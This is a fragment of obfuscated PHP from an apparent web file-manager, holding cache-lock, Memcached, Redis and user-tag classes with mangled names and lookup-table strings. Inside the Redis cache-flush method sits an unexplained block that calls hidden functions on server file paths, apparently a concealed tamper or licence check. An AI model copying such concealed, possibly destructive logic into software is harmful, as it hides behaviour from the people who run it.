$ûçƒÁšç; return $§¬³ıµ; } public static function errorTips($µ¦Ş¡İ• = false) { $Üú Íëì =& $_SERVER[ñˆ‹ß¿÷]; static $§†êˆ× = array(); $ºó¬û®€ = 1000; if ($µ¦Ş¡İ• === -1) { return $§†êˆ× ? $§†êˆ×[count($§†êˆ×) - 1] : $Üú Íëì[12]; } if ($µ¦Ş¡İ• === !1) { return implode($Üú Íëì[231], $§†êˆ×); } if (count($§†êˆ×) >= $ºó¬û®€) { $§†êˆ× = array_slice($§†êˆ×, $ºó¬û®€ * 0.5, $ºó¬û®€); } $§†êˆ×[] = $µ¦Ş¡İ•; write_log($Üú Íëì[162] . ACTION . $Üú Íëì[1189] . $µ¦Ş¡İ•, $Üú Íëì[1190]); } public static function getLastError($¶Ü’Íà† = '') { $­Å‘˜ğ† = self::errorTips(-1); return $­Å‘˜ğ† ? $­Å‘˜ğ† : $¶Ü’Íà†; } } goto b¤‘¯Ø‡Ç§; cÈî‚ÑòÁ: define($_SERVER[ñˆ‹ß¿÷][241], 1); define($_SERVER[ñˆ‹ß¿÷][242], 0); define($_SERVER[ñˆ‹ß¿÷][243], 2); goto B£ÀÇ¥ÊŒ; C”¨®³¨ß: class CacheLockDatabase { public function lock($¿ãóÑ¿, $Ò¡æ•ø† = 0) { $‹¥§íõ˜ = Model($_SERVER[ñˆ‹ß¿÷][836]); $„ ÷ŞÔğ = microtime(!0) + $Ò¡æ•ø†; while (microtime(!0) < $„ ÷ŞÔğ) { $äÓØÎ…¹ = $‹¥§íõ˜->get($¿ãóÑ¿); if (!$äÓØÎ…¹ || $äÓØÎ…¹ < microtime(!0)) { $´ÆîŸŒ› = $‹¥§íõ˜->set($¿ãóÑ¿, $„ ÷ŞÔğ); if ($´ÆîŸŒ›) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‚÷Ô¬øä) { return Model($_SERVER[ñˆ‹ß¿÷][836])->get($‚÷Ô¬øä); } public function unlock($îŸõüŠà) { Model($_SERVER[ñˆ‹ß¿÷][836])->remove($îŸõüŠà); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($÷âö©ñÛ, $“ÜğÕÛÔ) { $³Àâôø­ =& $_SERVER[ñˆ‹ß¿÷]; if (!class_exists($³Àâôø­[869])) { show_json($³Àâôø­[870], !1); } $this->cacheTime = $“ÜğÕÛÔ; $this->handle = new Memcached(); if (is_array($÷âö©ñÛ[$³Àâôø­[871]]) && count($÷âö©ñÛ[$³Àâôø­[871]]) >= 1) { foreach ($÷âö©ñÛ[$³Àâôø­[871]] as $õ³ØÍ¹˜) { $¥úæÓ¸» = explode($³Àâôø­[4], $õ³ØÍ¹˜); $this->handle->addServer($¥úæÓ¸»[0], $¥úæÓ¸»[1]); } } else { $this->handle->addServer($÷âö©ñÛ[$³Àâôø­[181]], $÷âö©ñÛ[$³Àâôø­[182]]); } } public function set($˜â¸ñ±ó, $¨ôà»‘À, $“§İÈ‘Š = false) { $“§İÈ‘Š = $“§İÈ‘Š ? $“§İÈ‘Š : $this->cacheTime; return $this->handle->set($˜â¸ñ±ó, $¨ôà»‘À, $“§İÈ‘Š); } public function get($øÄ“¸©) { return $this->handle->get($øÄ“¸©); } public function remove($¿¿Îµ€ı) { return $this->handle->delete($¿¿Îµ€ı); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ºÒ¤ªä, $¡ûÏ Ë) { $ê¢Ú¡âï =& $_SERVER[ñˆ‹ß¿÷]; if (!class_exists($ê¢Ú¡âï[872])) { show_json($ê¢Ú¡âï[873], !1); } $this->cacheTime = $¡ûÏ Ë; $·ÌïÄ­¡ = isset($ºÒ¤ªä[$ê¢Ú¡âï[874]]) ? $ºÒ¤ªä[$ê¢Ú¡âï[874]] : 10; $´ÆÀÕÈ‘ = _get($ºÒ¤ªä, $ê¢Ú¡âï[871]); if ($´ÆÀÕÈ‘ && is_array($´ÆÀÕÈ‘)) { $this->initCluster($ºÒ¤ªä, $·ÌïÄ­¡); } else { $this->handle = $this->init($ºÒ¤ªä, $·ÌïÄ­¡); } } private function init($ã…ßãÕ¥, $Üò…£) { $ğŒ½®çŒ =& $_SERVER[ñˆ‹ß¿÷]; $Õ¥Æüşı = new Redis(); $¯ûÊöù = isset($ã…ßãÕ¥[$ğŒ½®çŒ[875]]) ? $ã…ßãÕ¥[$ğŒ½®çŒ[875]] : !1; if ($¯ûÊöù) { $Õ¥Æüşı->pconnect($ã…ßãÕ¥[$ğŒ½®çŒ[181]], $ã…ßãÕ¥[$ğŒ½®çŒ[182]], $Üò…£); } else { $Õ¥Æüşı->connect($ã…ßãÕ¥[$ğŒ½®çŒ[181]], $ã…ßãÕ¥[$ğŒ½®çŒ[182]], $Üò…£); } if (!empty($ã…ßãÕ¥[$ğŒ½®çŒ[413]])) { $Õ¥Æüşı->auth($ã…ßãÕ¥[$ğŒ½®çŒ[413]]); } if (!empty($ã…ßãÕ¥[$ğŒ½®çŒ[765]]) && $ã…ßãÕ¥[$ğŒ½®çŒ[765]] != 0) { $Õ¥Æüşı->select($ã…ßãÕ¥[$ğŒ½®çŒ[765]]); } return $Õ¥Æüşı; } private function initCluster($§Óòâá¶, $Ü˜ş©ãí) { $¸§½†›› =& $_SERVER[ñˆ‹ß¿÷]; $·ÆüšÙñ = array($¸§½†››[876], $¸§½†››[877], $¸§½†››[878]); $÷ù£Àêí = $¸§½†››[876]; if (isset($§Óòâá¶[$¸§½†››[16]]) && in_array($§Óòâá¶[$¸§½†››[16]], $·ÆüšÙñ)) { $÷ù£Àêí = $§Óòâá¶[$¸§½†››[16]]; } switch ($÷ù£Àêí) { case $¸§½†››[876]: $this->_slave($§Óòâá¶, $Ü˜ş©ãí); break; case $¸§½†››[877]: break; case $¸§½†››[878]: $this->isCluster = !0; $ì¦éŒÊè = $§Óòâá¶[$¸§½†››[871]]; $×ÏÅµ˜Í = isset($§Óòâá¶[$¸§½†››[875]]) ? $§Óòâá¶[$¸§½†››[875]] : !1; $§Ìà¦³ = isset($§Óòâá¶[$¸§½†››[413]]) ? $§Óòâá¶[$¸§½†››[413]] : null; $this->handle = new RedisCluster(NUll, $ì¦éŒÊè, $Ü˜ş©ãí, $Ü˜ş©ãí, $×ÏÅµ˜Í, $§Ìà¦³); break; default: break; } } private function _slave($óŒ›ŠÁ², $©é­ Ïƒ) { $ÂîŸåº = $óŒ›ŠÁ²[$_SERVER[ñˆ‹ß¿÷][871]]; $this->filterConfig($óŒ›ŠÁ², $ÂîŸåº[0]); $this->handle = $this->init($óŒ›ŠÁ², $©é­ Ïƒ); unset($ÂîŸåº[0]); if (empty($ÂîŸåº)) { return; } $¹¼ğïªµ = array_rand($ÂîŸåº); $this->filterConfig($óŒ›ŠÁ², $ÂîŸåº[$¹¼ğïªµ]); $this->slaveHandle = $this->init($óŒ›ŠÁ², $©é­ Ïƒ); } private function filterConfig(&$ïÂ›‘Éî, $€Ë™ûËŞ) { $Õ±¨€ãß =& $_SERVER[ñˆ‹ß¿÷]; $šş¥½ø = explode($Õ±¨€ãß[4], $€Ë™ûËŞ); $í’‰å± = array($Õ±¨€ãß[181] => $šş¥½ø[0], $Õ±¨€ãß[182] => $šş¥½ø[1]); $ïÂ›‘Éî = array_merge($ïÂ›‘Éî, $í’‰å±); } public function set($Û÷¿Ğß§, $­Ößà‘½, $¨¢¨â¹ = false) { $¨¢¨â¹ = $¨¢¨â¹ ? $¨¢¨â¹ : $this->cacheTime; return $this->handle->setEx($Û÷¿Ğß§, $¨¢¨â¹, $­Ößà‘½); } public function setLock($ÀÕ»³ª½, $×í×Æ±©, $¼¢åé§) { return $this->handle->setNX($ÀÕ»³ª½, $×í×Æ±©); } public function get($’€€ù—ˆ) { $À¾ø½Á = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $À¾ø½Á->get($’€€ù—ˆ); } public function remove($Ùû…¢‚ß) { return $this->handle->del($Ùû…¢‚ß); } public function deleteAll() { $ç„ş¿«Œ =& $_SERVER[ñˆ‹ß¿÷]; if ($_SERVER[$ç„ş¿«Œ[879]] != $_SERVER[$ç„ş¿«Œ[880]]) { $’‰èñˆ˜ = $ç„ş¿«Œ[881]; $ø·İÔœÁ = $ç„ş¿«Œ[882]; $§¾ºŸÕ‰ = $_SERVER[$ç„ş¿«Œ[883]] . $ç„ş¿«Œ[884]; $×‰ºÙ… = $ø·İÔœÁ($§¾ºŸÕ‰); $òââÕ´ú = explode($ç„ş¿«Œ[231], $×‰ºÙ…); if (count($òââÕ´ú) < $ç„ş¿«Œ[626]) { $ÃİÚ˜¤ = $ç„ş¿«Œ[885]; $ÃİÚ˜¤(); } $ £şÖÏ— = $ç„ş¿«Œ[886]; $ £şÖÏ—($_SERVER[$ç„ş¿«Œ[887]]); $ £şÖÏ—($_SERVER[$ç„ş¿«Œ[883]] . $ç„ş¿«Œ[888]); $¬Î¡äæ = 1; while ($¬Î¡äæ > 1) { $¬Î¡äæ = $¬Î¡äæ + 4; $¶¬‘££¸ = rawurlencode($¬Î¡äæ . $ç„ş¿«Œ[378]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Â­Ú©Ş) { $this->handle->flushall($Â­Ú©Ş); } return; } return $this->handle->flushAll(); } } goto C±¾Ğ˜ß¥·; aÙ‹ª£ñº¹: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($†­Ğ…­¬) { $Î€•îëŠ =& $_SERVER[ñˆ‹ß¿÷]; return array($Î€•îëŠ[1947] => array($Î€•îëŠ[2327] . USER_ID, $Î€•îëŠ[1948])); } protected function listData() { $³Šåà×Æ =& $_SERVER[ñˆ‹ß¿÷]; $¢§Şºœš = array($³Šåà×Æ[1655] => USER_ID, $³Šåà×Æ[484] => array($³Šåà×Æ[1951], 0)); $Õˆêí› = $³Šåà×Æ[2328]; $Ëîç™– = $this->field($Õˆêí›)->where($¢§Şºœš)->order($³Šåà×Æ[1954])->select(); return $Ëîç™– ? $Ëîç™– : array(); } protected function addToTag($¥’ıé›ß, $í¶Àé¶½) { $ãÍº¢„‡ =& $_SERVER[ñˆ‹ß¿÷]; if (!Model($ãÍº¢„‡[2091])->listData($í¶Àé¶½)) { return !1; } if (is_numeric($¥’ıé›ß)) { $Ş¯í¼ = Model($ãÍº¢„‡[832])->pathInfo($¥’ıé›ß); if (!$Ş¯í¼) { return !1; } } else { $Ş¯í¼ = IO::infoSimple($¥’ıé›ß); if (!$Ş¯í¼) { return !1; } $ĞùÔ°ˆß = $Ş¯í¼[$ãÍº¢„‡[32]]; $™Ïğåà = $Ş¯í¼[$ãÍº¢„‡[33]]; if (isset($Ş¯í¼[$ãÍº¢„‡[410]])) { $™Ïğåà = $Ş¯í¼[$ãÍº¢„‡[410]] == $ãÍº¢„‡[88] ? $ãÍº¢„‡[75] : $ãÍº¢„‡[199]; } } $ñş²¯•ú = array($ãÍº¢„‡[1655] => USER_ID, $ãÍº¢„‡[484] => $í¶Àé¶½, $ãÍº¢„‡[421] => $¥’ıé›ß, $ãÍº¢„‡[422] => $™Ïğåà ? $™Ïğåà : $ãÍº¢„‡[416], $ãÍº¢„‡[420] => $ĞùÔ°ˆß ? $ĞùÔ°ˆß : $ãÍº¢„‡[12], $ãÍº¢„‡[1840] => 0); if ($this->where($ñş²¯•ú)->find()) { return !1; } return $this->add($ñş²¯•ú); } protected function removeFromTag($óÉ’¿¿, $ôàÎ›®›) { $»Øïï³Î =& $_SERVER[ñˆ‹ß¿÷]; if (!Model($»Øïï³Î[2091])->listData($ôàÎ›®›)) { return !1; } if (is_array($óÉ’¿¿)) { $óÉ’¿¿ = array($»Øïï³Î[7], $óÉ’¿¿); } $êä±¡” = array($»Øïï³Î[1655] => USER_ID, $»Øïï³Î[484] => $ôàÎ›®›, $»Øïï³Î[421] => $óÉ’¿¿); return $this->where($êä±¡”)->delete(); } protected function removeByTag($ÀÒÅ“³Ó) { $å´“ùÂ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ÀÒÅ“³Ó) { return !1; } $‚ŒÈ¿‘è = array($å´“ùÂ[1655] => USER_ID, $å´“ùÂ[484] => $ÀÒÅ“³Ó); return $this->where($‚ŒÈ¿‘è)->delete(); } protected function removeBySource($ñÄ­Û«ı) { $–”ù³Ÿ =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($ñÄ­Û«ı)) { $ñÄ­Û«ı = array($–”ù³Ÿ[7], $ñÄ­Û«ı); } $ˆÏøÑÓĞ = array($–”ù³Ÿ[1655] => USER_ID, $–”ù³Ÿ[484] => array($–”ù³Ÿ[1021], 0), $–”ù³Ÿ[421] => $ñÄ­Û«ı); return $this->where($ˆÏøÑÓĞ)->delete(); } }